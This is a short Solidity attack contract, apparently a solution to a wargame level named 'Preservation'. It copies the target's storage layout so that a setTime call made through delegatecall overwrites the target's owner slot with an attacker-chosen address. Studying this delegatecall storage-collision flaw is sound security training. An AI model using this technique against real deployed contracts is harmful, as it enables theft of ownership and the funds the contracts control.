// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "./Preservation.sol";

contract Delegate {


    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    
    Preservation public preservation;
    
    constructor(Preservation _preservation) {
        preservation = _preservation;
    }
    
    // This function will be called via delegatecall from Preservation
    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
